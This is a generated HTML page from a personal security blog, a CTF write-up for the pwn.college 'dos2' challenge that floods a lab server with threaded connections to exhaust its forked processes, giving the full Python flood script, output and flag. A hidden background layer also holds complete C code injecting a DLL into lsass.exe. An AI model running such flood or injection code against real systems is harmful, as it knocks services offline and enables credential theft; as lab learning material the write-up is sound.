@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🧨 Challenge Writeup: `dos2`</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🧨 Challenge Writeup: `dos2`" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🧨 Challenge Writeup: `dos2`</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <hr />
+
+<h2 id="-challenge-summary">📌 Challenge Summary</h2>
+
+<blockquote>
+  <p><strong>Task</strong>:<br />
+The client at <code class="language-plaintext highlighter-rouge">10.0.0.3</code> is communicating with the server at <code class="language-plaintext highlighter-rouge">10.0.0.2</code> on port <code class="language-plaintext highlighter-rouge">31337</code>. Deny this service.</p>
+</blockquote>
+
+<blockquote>
+  <p><strong>Hint</strong>:<br />
+The server forks a new process for each client connection.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-understanding-the-setup">🧠 Understanding the Setup</h2>
+
+<p>We’re given:</p>
+
+<ul>
+  <li>A server at <code class="language-plaintext highlighter-rouge">10.0.0.2</code> listening on port <code class="language-plaintext highlighter-rouge">31337</code>.</li>
+  <li>The server forks a <strong>new process</strong> for each incoming connection.</li>
+  <li>A client at <code class="language-plaintext highlighter-rouge">10.0.0.3</code> periodically connects to the server and sends <code class="language-plaintext highlighter-rouge">"Hello, World!\n"</code>.</li>
+  <li>If the client fails to connect (e.g., due to timeout or resource exhaustion), it prints the <strong>flag</strong>.</li>
+</ul>
+
+<blockquote>
+  <p>The goal: <strong>Block the client’s access to the server</strong>, using a <strong>DoS</strong> (Denial-of-Service) strategy.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-how-we-exploit-it">🔍 How We Exploit It</h2>
+
+<p>The key observation:</p>
+
+<ul>
+  <li>The server forks a new process per client → this opens a known <strong>resource exhaustion attack surface</strong>.</li>
+  <li>By flooding the server with many fake connections (each causing a fork), we exhaust the system’s resources (max process limit or socket backlog).</li>
+  <li>When the legitimate client tries to connect and fails (due to <code class="language-plaintext highlighter-rouge">TimeoutError</code>), it will print the <strong>flag</strong>.</li>
+</ul>
+
+<hr />
+
+<h2 id="-attack-plan">🧪 Attack Plan</h2>
+
+<ol>
+  <li>Spawn 100 threads.</li>
+  <li>Each thread continuously:
+    <ul>
+      <li>Connects to <code class="language-plaintext highlighter-rouge">10.0.0.2:31337</code></li>
+      <li>Sends junk data</li>
+      <li>Closes the connection</li>
+    </ul>
+  </li>
+  <li>Keep the script alive until the client breaks and reveals the flag.</li>
+</ol>
+
+<hr />
+
+<h2 id="-final-exploit">💣 Final Exploit</h2>
+
+<p><strong><code class="language-plaintext highlighter-rouge">flood.py</code></strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">threading</span>
+
+<span class="k">def</span> <span class="nf">flood</span><span class="p">():</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+            <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">10.0.0.2</span><span class="sh">"</span><span class="p">,</span> <span class="mi">31337</span><span class="p">))</span>
+            <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">)</span>  <span class="c1"># Send junk
+</span>            <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">pass</span>
+
+<span class="c1"># Create 100 concurrent flooding threads
+</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">flood</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="nf">start</span><span class="p">()</span>
+
+<span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Flooding... Press Enter to stop</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="output">Output</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flooding... Press Enter to stop
+pwn.college<span class="o">{</span>gJua2Qqy8UJ1oH1Eb_1zNpgBNXg.0FO1AjNxwSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{gJua2Qqy8UJ1oH1Eb_1zNpgBNXg.0FO1AjNxwSM0IzMyEzW}
+</code></pre></div></div>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
